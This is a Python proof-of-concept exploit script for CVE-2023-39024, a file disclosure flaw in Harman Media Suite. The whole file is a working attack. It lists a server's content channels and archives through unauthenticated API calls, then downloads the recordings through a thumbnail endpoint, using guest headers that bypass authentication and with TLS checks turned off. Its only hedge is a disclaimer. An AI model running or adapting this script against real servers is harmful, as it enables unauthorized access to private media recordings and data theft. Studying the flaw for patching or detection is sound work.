'''
CVE-2023-39024.py
Author: BenTheCyberOne

Exploits CVE-2023-39024 (LFD) on a vulnerable Harman Media Suite host. Attempts to download recordings from accessible channels.

I am not responsible for any abuse of this POC

'''

import requests
import argparse
requests.packages.urllib3.disable_warnings() 

#For massive files, download via file stream
def download_file(url, headers):
    local_filename = url.split('/')[-1].split('&host')[0]
    with requests.get(url, headers=headers, stream=True,verify=False) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    return local_filename

def main(base_url):
    # First request to {base_url}/userportal/api/rest/contentChannels/ to get the channel IDs
    content_response = requests.get(f"{base_url}/userportal/api/rest/contentChannels/?startIndex=0&pageSize=4&sort=TIME&showType=all",verify=False)
    
    if content_response.status_code == 200:
        content_data = content_response.json()
        
        # Iterate through the channels
        for channel in content_data.get("plcm-content-channel", []):
            channel_id = channel.get("channelId")
            if channel_id:
                # Second request to get the archives data
                archive_response = requests.get(f"{base_url}/userportal/api/rest/contentChannels/{channel_id}/archives/?startIndex=0&pageSize=15&sort=time&onlyIncludeApproved=true",verify=False)
                
                if archive_response.status_code == 200:
                    archives = archive_response.json()
                    
                    # Iterate through archives and check for archive files (we download these!)
                    for archive in archives:
                        archive_files = archive.get("archiveFiles", [])
                        for file in archive_files:
                            file_name = file.get("fileName")
                            flocate = file.get("flocate")
                            
                            if file_name and flocate:
                                # Construct the LFD URL
                                thumbnail_url = f"{base_url}/userportal/thumbnails?thumbnailFilePath={flocate}/{file_name}&host=localhost"
                                
                                print(f"Full URL: {thumbnail_url}")
                                print(f"File: {file_name}")
                                input("Press Enter to download the file...")
                                
                                # Make the request to download the file. These headers are required for anonymous access
                                headers = {
                                    "Cookie": "allowGuest=true",
                                    "Authorization": "Bearer anonymous"
                                }
                                
                                downloaded_file = download_file(thumbnail_url, headers)
                                print(f"Downloaded file: {downloaded_file}")
                else:
                    print(f"Failed to get archives for channel {channel_id}: {archive_response.status_code}")
    else:
        print(f"Failed to get channels: {content_response.status_code}")
        if content_response.status_code == 403:
            print("This host is probably not vulnerable.")
        #print(content_response.content)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script to exploit CVE-2023-39024 and download files from a Harman Media Suite server.')
    parser.add_argument('-u','--url', type=str, help='Base URL of the server (e.g., http://example.com)')    
    args = parser.parse_args()
    main(args.url)
